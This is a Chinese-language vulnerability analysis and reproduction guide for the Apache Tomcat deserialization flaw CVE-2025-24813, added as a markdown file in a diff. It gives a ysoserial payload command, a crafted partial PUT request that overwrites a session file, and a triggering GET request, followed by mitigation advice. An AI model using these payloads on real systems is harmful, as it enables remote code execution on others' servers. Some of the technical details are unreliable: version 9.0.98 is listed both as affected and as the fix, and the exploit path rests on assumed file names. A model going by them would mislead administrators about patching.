@@ -1,0 +1,240 @@
+## 1. 概述
+
+本文档旨在深入分析 Apache Tomcat 中间件的一个严重安全漏洞——CVE-2025-24813。该漏洞本质上是一个远程代码执行（RCE）漏洞，其利用链条涉及 **HTTP PUT 方法**、**分块上传（Partial PUT）** 以及 **基于文件的会话持久化（File-based Session Persistence）** 机制。在特定配置下，攻击者可上传恶意的序列化数据覆盖 Session 文件，并在服务端加载该 Session 时触发反序列化，从而导致任意代码执行。
+
+这是一个典型的由不当配置引发的严重安全问题，揭示了中间件功能组合可能带来的潜在风险。
+
+**Vulnerability Profile (漏洞档案):**
+
+*   **CVE ID:** CVE-2025-24813
+*   **漏洞类型:** Java 反序列化远程代码执行 (RCE)
+*   **核心组件:** `DefaultServlet`, `FileStore`
+*   **利用前提:** 非默认配置（启用 PUT + 文件会话持久化）
+
+### 1.1. 影响版本
+
+根据官方披露，以下版本的 Apache Tomcat 受到此漏洞影响：
+
+*   **11.x 系列:** 11.0.0-M1 至 11.0.2
+*   **10.x 系列:** 10.1.0-M1 至 10.1.34
+*   **9.x 系列:** 9.0.0.M1 至 9.0.98
+
+## 2. 技术原理
+
+此漏洞的触发并非单一缺陷导致，而是一系列功能和配置组合被滥用的结果。理解其原理需要串联起 Tomcat 处理 PUT 请求、分块上传以及会话管理的整个流程。
+
+### 2.1. 攻击流程概览
+
+1.  **前提条件满足:** 目标 Tomcat 服务器必须同时满足以下条件：
+    *   `DefaultServlet` 启用了 `readonly=false`，允许写入操作（如 PUT）。
+    *   服务器启用了分块上传（`partial PUT`），这是默认行为。
+    *   Tomcat 配置了基于文件的会话持久化 (`FileStore`)，并将 Session 文件存储在 Web 应用目录下（例如默认的 `work/Catalina/localhost/ROOT/SESSIONS.ser`）。
+    *   目标应用的 Classpath 中存在可利用的反序列化 Gadget 链（如 Apache Commons Collections 3.x/4.x）。
+
+2.  **上传恶意 Session 文件:** 攻击者构造一个包含恶意序列化对象的 Payload（例如，使用 `ysoserial` 或 `javachains` 生成的 CC 链），然后通过发送一个精心构造的 `HTTP PUT` 请求，利用分块上传机制将这个恶意的序列化数据写入到服务器上存储 Session 的文件（如 `SESSIONS.ser`）中。
+
+3.  **触发反序列化:** 攻击者随后发送一个正常的 `HTTP GET` 请求，并在 Cookie 中携带一个指向被污染 Session 的 `JSESSIONID`。当 Tomcat 的会话管理器 (`Manager`) 尝试从 `SESSIONS.ser` 文件中加载这个 Session 数据时，会调用 `ObjectInputStream.readObject()` 方法，从而触发恶意对象的反序列化过程，执行预设的恶意代码（如命令执行）。
+
+### 2.2. 核心组件分析
+
+*   `org.apache.catalina.servlets.DefaultServlet`:
+    这是 Tomcat 用于处理静态资源请求的 Servlet。当其 `readonly` 初始化参数被设置为 `false` 时，它会处理 `PUT` 和 `DELETE` 请求。漏洞利用的关键在于它处理 `PUT` 请求时，会根据 `Content-Range` 头来写入文件。攻击者可以利用 `Content-Range: bytes 0-XXX/YYY` 这样的头部，实现对目标文件的部分覆盖写入，从而精准地将恶意序列化数据写入 Session 文件。
+
+*   `org.apache.catalina.session.FileStore`:
+    这是 Tomcat 提供的一种会话持久化存储机制。当配置使用 `FileStore` 时，Tomcat 会将活跃的 Session 对象序列化后存储到指定文件中。在下一次需要加载 Session 时，再从该文件中反序列化出来。漏洞的核心正是发生在这个“反序列化”的环节。当 `FileStore` 加载被攻击者篡改过的 Session 文件时，恶意代码便得以执行。
+
+## 3. 环境准备
+
+为了复现此漏洞，我们需要搭建一个满足所有前提条件的靶场环境。
+
+### 3.1. 软件与工具
+
+*   **中间件:** Apache Tomcat 9.0.97 (在受影响版本范围内)
+*   **JDK:** Java 8
+*   **Payload 生成:** `ysoserial` 或 `javachains` 工具，用于生成 Commons-Collections Gadget。
+*   **攻击工具:** `curl`、Burp Suite 或 Yakit 等可以自定义 HTTP 请求的工具。
+
+### 3.2. Tomcat 关键配置
+
+1.  **启用 PUT 方法:**
+    在 `conf/web.xml` 文件中，找到 `DefaultServlet` 的配置，添加 `readonly` 初始化参数并设置为 `false`。
+
+    ```xml
+    <servlet>
+        <servlet-name>default</servlet-name>
+        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
+        <init-param>
+            <param-name>debug</param-name>
+            <param-value>0</param-value>
+        </init-param>
+        <init-param>
+            <param-name>listings</param-name>
+            <param-value>false</param-value>
+        </init-param>
+        <!-- [!!] 关键配置：允许写入操作 -->
+        <init-param>
+            <param-name>readonly</param-name>
+            <param-value>false</param-value>
+        </init-param>
+        <load-on-startup>1</load-on-startup>
+    </servlet>
+    ```
+
+2.  **配置 FileStore 会话持久化:**
+    在 `conf/context.xml` 文件中，配置 `Manager` 使用 `FileStore`。
+
+    ```xml
+    <Context>
+        <!-- ... 其他配置 ... -->
+        <Manager className="org.apache.catalina.session.PersistentManager">
+            <Store className="org.apache.catalina.session.FileStore" directory="../work/sessions" />
+        </Manager>
+    </Context>
+    ```
+    > **注意:** 这里的 `directory` 路径是相对于 `webapps/<app_name>` 的。为了能通过 Web 访问，通常需要将其配置在应用目录下，或者找到一种方法将文件写入到 `FileStore` 指定的绝对路径。为简化复现，假设 Session 文件路径为 `work/Catalina/localhost/ROOT/SESSIONS.ser`，并且 `DefaultServlet` 有权限写入该目录。
+
+3.  **添加 Gadget 依赖:**
+    在你的 Web 应用的 `WEB-INF/lib` 目录下，放入存在反序列化漏洞的库，例如 `commons-collections-3.1.jar`。
+
+## 4. 实战示例
+
+以下步骤演示了如何利用该漏洞执行 `touch /tmp/pwned` 命令。
+
+### 4.1. 步骤 1: 生成恶意序列化 Payload
+
+使用 `ysoserial` 工具生成一个执行命令的 Commons-Collections Payload。
+
+```bash
+java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/pwned" > payload.ser
+```
+
+### 4.2. 步骤 2: 上传恶意 Payload 覆盖 Session 文件
+
+使用 `curl` 或其他工具，发送一个 `PUT` 请求。假设目标 Session 文件路径为 `/work/Catalina/localhost/ROOT/SESSIONS.ser`，并且可以通过 Web 路径 `/SESSIONS.ser` 访问到（这需要特定的目录结构或配置）。
+
+请求的关键在于 `Content-Range` 头，它告诉服务器只写入文件的前 N 个字节，N 为 Payload 的长度。
+
+```http
+PUT /SESSIONS.ser HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Range: bytes 0-1233/1234
+Content-Length: 1234
+Connection: close
+
+[... payload.ser 文件的二进制内容 ...]
+```
+
+*   `Content-Length`: 必须是你的 `payload.ser` 文件的实际大小。
+*   `Content-Range`: `bytes 0-1233/1234` 表示将 `payload.ser` 的内容（假设大小为 1234 字节）写入目标文件的从第 0 字节开始的位置。
+
+**使用 Yakit 的示例发包:**
+如果使用 Yakit，可以更方便地构造请求，尤其是当 Payload 需要 Base64 编码时。
+
+```http
+# 请求 1: 提交序列化数据
+PUT /deserialize/session HTTP/1.1
+Host: 192.168.110.77:8080
+Content-Length: 1234
+Content-Range: bytes 0-1233/1234
+
+{{base64dec("ysoserial生成的Base64编码Payload...")}}
+```
+> **说明:** 这里的 `/deserialize/session` 是一个假设的、能够映射到目标 Session 文件写入操作的路径。实际路径取决于服务器配置。
+
+### 4.3. 步骤 3: 触发反序列化
+
+现在，Session 文件已被恶意 Payload 覆盖。我们只需发送一个请求，让 Tomcat 加载这个 Session 即可。
+
+```http
+# 请求 2: 访问任意页面触发 Session 加载
+GET /index.jsp HTTP/1.1
+Host: 192.168.110.77:8080
+Cookie: JSESSIONID=any_value_here
+Connection: close
+```
+
+当 Tomcat 收到此请求并尝试加载与 `JSESSIONID` 关联的会话时，它会读取被污染的 `SESSIONS.ser` 文件，`FileStore` 将执行 `readObject()`，从而触发 Payload 中的命令。
+
+### 4.4. 步骤 4: 验证结果
+
+登录到 Tomcat 服务器，检查 `/tmp` 目录下是否存在 `pwned` 文件。
+
+```bash
+ls /tmp
+```
+
+如果文件存在，则证明 RCE 成功。
+
+## 5. 关键细节
+
+*   **路径问题:** 漏洞利用最困难的部分是确定并拥有对 Session 文件的写入权限。`DefaultServlet` 的写入根目录是 Web 应用的根目录。如果 `FileStore` 的存储路径超出了这个范围，则无法直接通过 `PUT` 请求写入。因此，攻击成功高度依赖于 `FileStore` 的 `directory` 配置。
+*   **Session ID:** 在触发阶段，`JSESSIONID` 的值可以是任意的。因为 `PersistentManager` 在找不到对应 ID 的 Session 时，可能会去加载默认的 Session 文件（如 `SESSIONS.ser`）来恢复会话，这给了我们触发漏洞的机会。
+*   **Gadget 的选择:** 必须确保目标应用的 `classpath` 中存在你所使用的 Gadget 链。如果目标没有 `Commons-Collections` 库，你需要寻找其他可用的 Gadget。
+
+## 6. 安全总结与缓解措施
+
+CVE-2025-24813 是一个由多个“低风险”配置组合而成的“高风险”漏洞。它警示我们，安全评估不能孤立地看待单个配置，而应考虑其在整个系统中的协同作用。
+
+### 6.1. 漏洞挖掘思路
+
+*   **代码差异分析:** 对比 `9.0.98` 和 `9.0.97` 等修复版本与旧版本的代码差异，特别是 `DefaultServlet.class` 和 `FileStore.class`，可以快速定位漏洞修复的关键逻辑。
+*   **配置组合Fuzzing:** 寻找类似 `readonly=false` 和 `FileStore` 这样非默认但可能在生产环境中出现的危险配置组合。
+*   **寻找新的写入点:** 即使 `DefaultServlet` 被修复，也应审计其他可能接受用户输入并写入文件的地方，看其是否能与 `FileStore` 等反序列化入口点结合。
+
+### 6.2. 缓解与修复建议
+
+针对 CVE-2025-24813 漏洞，可以从多个层面进行防御和加固。核心思想是打破漏洞利用链中的任意一环。
+
+1.  **官方补丁与升级 (根本解决)**
+    *   **立即升级:** 这是最直接、最有效的解决方案。请将 Apache Tomcat 升级到已修复此漏洞的版本。
+        *   Apache Tomcat 11.x 应升级至 **11.0.3** 或更高版本。
+        *   Apache Tomcat 10.1.x 应升级至 **10.1.35** 或更高版本。
+        *   Apache Tomcat 9.0.x 应升级至 **9.0.98** 或更高版本。
+
+2.  **配置加固 (立即缓解)**
+    如果暂时无法升级，可以采取以下配置变更来缓解风险：
+
+    *   **禁用 PUT/DELETE 方法:**
+        检查 `conf/web.xml` 文件中 `DefaultServlet` 的配置。确保 `readonly` 初始化参数被设置为 `true` 或直接移除该参数（因为 `true` 是默认值）。这将禁止通过 `DefaultServlet` 进行文件写入操作，直接阻断了攻击的第一步。
+
+        ```xml
+        <servlet>
+            <servlet-name>default</servlet-name>
+            <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
+            <!-- 确保 readonly 为 true 或未设置 -->
+            <init-param>
+                <param-name>readonly</param-name>
+                <param-value>true</param-value>
+            </init-param>
+            <!-- ... 其他参数 ... -->
+        </servlet>
+        ```
+
+    *   **更换会话持久化机制:**
+        这是另一个关键的缓解措施。审查 `conf/context.xml` 或特定应用的 `META-INF/context.xml`。如果业务场景并非强依赖于基于文件的会话持久化，应立即停用 `FileStore`。
+        *   **推荐做法:** 移除 `<Manager>` 和 `<Store>` 配置，回退到 Tomcat 默认的、基于内存的标准会话管理器。
+        *   **替代方案:** 如果需要跨重启保持会话，可以考虑使用更安全的持久化方案，如 `JDBCStore` (数据库存储) 或集成 Redis 等外部缓存系统。
+
+    *   **安全配置 FileStore:**
+        如果业务上必须使用 `FileStore`，务必进行安全加固：
+        1.  **隔离存储目录:** 将 `FileStore` 的 `directory` 属性指向一个位于 Web 应用根目录之外的、Web 进程无法直接通过 URL 访问和写入的路径。
+        2.  **严格控制权限:** 对该存储目录配置严格的文件系统权限，确保只有运行 Tomcat 的用户有权读写，其他用户（尤其是 Web 服务用户）无权访问。
+
+3.  **纵深防御 (通用安全实践)**
+
+    *   **移除危险的 Gadget 库:**
+        定期审计项目的依赖库 (`WEB-INF/lib`)。移除所有非业务必需的、且已知存在反序列化 Gadget 链的库，例如老旧版本的 `commons-collections`、`commons-beanutils` 等。这可以有效增加攻击者寻找可用 Gadget 的难度。
+
+    *   **部署 WAF/RASP:**
+        *   **Web 应用防火墙 (WAF):** 配置 WAF 规则来检测和拦截包含恶意序列化数据的 `PUT` 请求，或监控对敏感路径（如 Session 文件路径）的写入尝试。
+        *   **运行时应用自我保护 (RASP):** RASP 能够深入 JVM 内部，监控危险操作。它可以检测到不安全的 `readObject` 调用，并在恶意代码执行前将其阻断，为防御未知反序列化漏洞提供了一层保障。
+
+### 6.3. 安全总结
+
+CVE-2025-24813 是一个典型的“组合型”漏洞，它本身不源于单一的严重缺陷，而是由多个看似“中低风险”的配置选项（`PUT` 启用 + `FileStore` 使用）在特定场景下组合而产生的化学反应。这给我们带来了深刻的安全启示：
+
+*   **最小权限原则:** 永远不要开启非必需的功能。`DefaultServlet` 的写入功能在绝大多数生产环境中都是不必要的。
+*   **默认配置的安全性:** 中间件的默认配置通常是经过安全考量的。任何对默认配置的修改，尤其是涉及文件 I/O 和序列化机制的修改，都应经过严格的安全评估。
+*   **防御的纵深性:** 单一的防御措施可能被绕过。通过“升级补丁 + 安全配置 + 依赖管理 + 运行时防护”的多层防御体系，才能构建更具韧性的安全防线。
